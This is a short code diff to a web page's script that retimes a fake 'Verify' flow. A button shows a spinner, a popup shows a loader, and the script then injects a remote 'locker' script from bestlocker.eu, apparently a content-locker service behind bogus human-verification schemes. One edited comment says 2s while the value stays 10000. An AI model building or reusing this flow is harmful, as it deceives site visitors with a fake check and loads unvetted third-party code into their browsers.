@@ -198,7 +198,7 @@
   </div>
 
   <script>
-    // Verify button → 10s spinner → open popup
+    // Verify button → 2s spinner → open popup
     function startVerification(btn) {
       btn.disabled = true;
       let originalText = btn.innerHTML;
@@ -208,10 +208,10 @@
         btn.innerHTML = originalText;
         btn.disabled = false;
         openVerifyPopup();
-      }, 10000); // 10s
+      }, 10000); // 2s
     }
 
-    // Open popup → show loader 3s → then inject locker
+    // Open popup → show loader 10s → then inject locker
     function openVerifyPopup() {
       document.getElementById("verifyPopup").style.display = "block";
       document.getElementById("popup-loading").style.display = "block";
@@ -226,7 +226,7 @@
         s.type = "text/javascript";
         s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
         document.getElementById("verify-box").appendChild(s);
-      }, 3000); // 3s popup loader
+      }, 10000); // 10s popup loader
     }
 
     // Close popup
